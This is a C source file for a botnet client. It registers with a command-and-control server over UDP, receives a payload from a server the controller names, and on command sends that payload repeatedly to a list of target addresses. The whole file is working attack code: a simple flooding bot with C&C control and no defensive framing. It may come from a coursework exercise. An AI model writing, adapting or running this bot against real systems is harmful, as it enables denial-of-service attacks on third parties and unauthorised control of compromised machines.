#include <stdio.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>
#define MAXLEN 512
#define MSGSIZE 761

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: ./bot server_ip server_port\n");
        exit(1);
    }

    char *ip = argv[1];
    char *port = argv[2];

    int clientfd = socket(AF_INET, SOCK_DGRAM, 0);

    struct sockaddr_in server;
    memset(&server, 0, sizeof server);

    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(port));
    inet_pton(AF_INET, ip, &(server.sin_addr));

    char *reg = "REG\n";
    if (sendto(clientfd, reg, strlen(reg), 0, (struct sockaddr *)&server, sizeof server) != -1)
        printf("Sent message to C&C\n");
    else
    {
        printf("Couldn't register\n");
        exit(1);
    }
    int servlen = sizeof server;
    /* struct MSG buf; */

    char payload[MAXLEN] = {0};

    char buf[MSGSIZE];

    while (1)
    {
        memset(buf, 0, sizeof buf);
        int msglen = recvfrom(clientfd, buf, sizeof buf, 0, (struct sockaddr *)&server, &servlen);
        printf("Received message from C&C with lenght %d\n", msglen);
        if (buf[0] == '0')
        {
            printf("Executing command PROG\n");
            memset(payload, 0, sizeof payload);
            struct sockaddr_in dest;
            memset(&dest, 0, sizeof dest);

            dest.sin_family = AF_INET;

            char port[22];
            memcpy(port, buf + 17, 22);
            char ip[16];
            memcpy(ip, buf + 1, 16);

            /* dest.sin_port = htons(atoi(buf.PORT1));
            inet_pton(AF_INET,buf.IP1,&(dest.sin_addr)); */

            dest.sin_port = htons(atoi(port));
            inet_pton(AF_INET, ip, &(dest.sin_addr));

            char *msg = "HELLO";

            if (sendto(clientfd, msg, strlen(msg), 0, (struct sockaddr *)&dest, sizeof dest) != -1)
                printf("Sent message to UDP_server\n");

            int destlen = sizeof dest;

            if (recvfrom(clientfd, payload, sizeof payload, 0, (struct sockaddr *)&dest, &destlen) != -1)
                printf("Received payload: %s\n", payload);
        }
        else if (buf[0] == '1')
        {
            int l = (msglen - 1) / 38;
            for (int s = 0; s < 15; s++)
            {
                for (int i = 0; i < l; i++)
                {
                    struct sockaddr_in dest;
                    int offset = i * 38 + 1;
                    memset(&dest, 0, sizeof dest);

                    char port[22];
                    memcpy(port, buf + offset + 16, 22);
                    char ip[16];
                    memcpy(ip, buf + offset, 16);

                    dest.sin_family = AF_INET;
                    dest.sin_port = htons(atoi(port));
                    inet_pton(AF_INET, ip, &(dest.sin_addr));

                    if (sendto(clientfd, payload, strlen(payload), 0, (struct sockaddr *)&dest, sizeof dest) != -1)
                        printf("Sent message to destination number %d\n", i + 1);
                }
                sleep(1);
            }
        }
    }

    return 0;
}
